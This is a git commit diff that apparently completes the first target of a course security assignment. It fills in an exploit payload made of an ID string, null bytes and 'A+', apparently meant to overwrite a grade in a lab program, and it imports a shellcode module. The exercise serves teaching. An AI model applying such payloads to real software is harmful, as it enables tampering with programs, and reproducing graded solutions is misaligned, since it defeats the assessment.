3c2758171d527cedd160c34bb3e3d79d65b08051
dconnorj <connor_dalley@protonmail.com>
2024-09-22 20:52:22 -0600

    completed sol0

--- A2/targets/sol0.py
+++ A2/targets/sol0.py
@@ -3,7 +3,9 @@ from struct import pack
 from shellcode import shellcode
 
 # Implement your attack here!
-payload = ''
+payload =b'u1027506'
+payload += b'\x00\x00'
+payload += b'A+'
 
 # Launch the attack!
 sys.stdout.buffer.write(payload)
